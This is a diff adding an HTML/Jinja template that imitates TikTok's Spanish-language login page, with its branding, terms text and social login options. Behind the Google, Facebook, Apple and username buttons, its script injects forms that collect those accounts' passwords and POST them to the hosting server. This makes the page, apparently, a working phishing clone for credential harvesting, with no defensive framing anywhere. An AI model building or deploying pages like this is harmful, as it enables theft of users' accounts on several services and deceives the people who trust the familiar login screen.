@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Inicia sesión en TikTok</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      color: #000;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px 32px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+    }
+
+    .header-left img {
+      height: 32px;
+      margin-right: 8px;
+    }
+
+    .header-left span {
+      font-size: 20px;
+      font-weight: 600;
+    }
+
+    .header-right a {
+      font-size: 14px;
+      text-decoration: none;
+      color: #333;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      margin-top: 40px;
+    }
+
+    .login-box {
+      width: 400px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: #888;
+      margin-bottom: 30px;
+    }
+
+    .login-option {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      margin-bottom: 12px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .login-option:hover {
+      background-color: #f9f9f9;
+    }
+
+    .login-option img {
+      width: 20px;
+      height: 20px;
+      margin-right: 12px;
+    }
+
+    .login-option span {
+      font-size: 14px;
+      text-align: left;
+    }
+
+    .terms {
+      font-size: 12px;
+      color: #888;
+      margin-top: 20px;
+      padding: 0 16px;
+    }
+
+    .terms a {
+      color: #333;
+      text-decoration: underline;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 30px;
+    }
+
+    .footer a {
+      color: #fe2c55;
+      text-decoration: none;
+      font-weight: 600;
+      margin-left: 5px;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .custom-form input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    .custom-form button {
+      width: 100%;
+      padding: 10px;
+      background-color: #fe2c55;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    .custom-form button:hover {
+      background-color: #e0254b;
+    }
+
+    .back-button {
+      text-align: left;
+      margin: 20px 0;
+      cursor: pointer;
+      color: #333;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .back-button:hover {
+      text-decoration: underline;
+    }
+
+    #qr-code {
+      margin-top: 20px;
+    }
+
+    form {
+      display: contents;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <div class="header-left">
+      <img src="{{ url_for('static', filename='icons/tiktok.svg') }}" alt="TikTok logo">
+      <span>TikTok</span>
+    </div>
+    <div class="header-right">
+      <a href="#">❓ Comentarios y ayuda</a>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="login-box">
+      <h1 id="main-title">Inicia sesión en TikTok</h1>
+      <p class="subtitle" id="main-subtitle">Administra tu cuenta, lee notificaciones,<br>comenta videos y mucho más.</p>
+
+      <!-- OPCIONES -->
+      <div id="login-options">
+        <div class="login-option" onclick="showForm('qr')">
+          <img src="{{ url_for('static', filename='icons/qr.svg') }}" alt="QR">
+          <span>Usar código QR</span>
+        </div>
+
+        <div class="login-option" onclick="showForm('user')">
+          <img src="{{ url_for('static', filename='icons/user.svg') }}" alt="User">
+          <span>Usar teléfono, correo electrónico o nombre de usuario</span>
+        </div>
+
+        <div class="login-option" onclick="showForm('facebook')">
+          <img src="{{ url_for('static', filename='icons/facebook.svg') }}" alt="Facebook">
+          <span>Continuar con Facebook</span>
+        </div>
+
+        <div class="login-option" onclick="showForm('google')">
+          <img src="{{ url_for('static', filename='icons/google.svg') }}" alt="Google">
+          <span>Continuar con Google</span>
+        </div>
+
+        <div class="login-option" onclick="showForm('apple')">
+          <img src="{{ url_for('static', filename='icons/apple.svg') }}" alt="Apple">
+          <span>Continuar con Apple</span>
+        </div>
+      </div>
+
+      <!-- FORMULARIO -->
+      <div id="custom-form" class="custom-form hidden">
+        <div class="back-button" onclick="goBack()">← Volver atrás</div>
+        <form method="POST" id="form-area">
+          <!-- Contenido dinámico -->
+        </form>
+      </div>
+
+      <!-- Términos -->
+      <p class="terms">
+        Al continuar, confirmas que estás de acuerdo con los
+        <a href="#">Términos del servicio</a> de TikTok y que leíste la
+        <a href="#">Política de privacidad</a>.
+      </p>
+
+      <div class="footer">
+        ¿No tienes una cuenta?
+        <a href="#">Registrarse</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- JS -->
+  <script>
+    function showForm(type) {
+      document.getElementById('login-options').classList.add('hidden');
+      document.getElementById('custom-form').classList.remove('hidden');
+
+      const form = document.getElementById('form-area');
+      form.innerHTML = '';
+
+      if (type === 'google') {
+        form.innerHTML = `
+          <input type="email" name="google_email" placeholder="Correo de Google" required>
+          <input type="password" name="google_password" placeholder="Contraseña" required>
+          <button type="submit">Continuar con Google</button>
+        `;
+      } else if (type === 'facebook') {
+        form.innerHTML = `
+          <input type="text" name="facebook_email" placeholder="Correo electrónico o número de teléfono" required>
+          <input type="password" name="facebook_password" placeholder="Contraseña" required>
+          <button type="submit">Continuar con Facebook</button>
+        `;
+      } else if (type === 'apple') {
+        form.innerHTML = `
+          <input type="text" name="apple_id" placeholder="Apple ID" required>
+          <input type="password" name="apple_password" placeholder="Contraseña" required>
+          <button type="submit">Continuar con Apple</button>
+        `;
+      } else if (type === 'user') {
+        form.innerHTML = `
+          <input type="text" name="username" placeholder="Número de teléfono, correo electrónico o nombre de usuario" required>
+          <input type="password" name="password" placeholder="Contraseña" required>
+          <button type="submit">Iniciar sesión</button>
+        `;
+      } else if (type === 'qr') {
+        form.innerHTML = `
+          <img id="qr-code" src="{{ url_for('static', filename='icons/qr.svg') }}" alt="QR" width="150">
+          <p>Escanea este código con tu app de TikTok para iniciar sesión.</p>
+        `;
+      }
+    }
+
+    function goBack() {
+      document.getElementById('custom-form').classList.add('hidden');
+      document.getElementById('login-options').classList.remove('hidden');
+    }
+  </script>
+</body>
+</html>
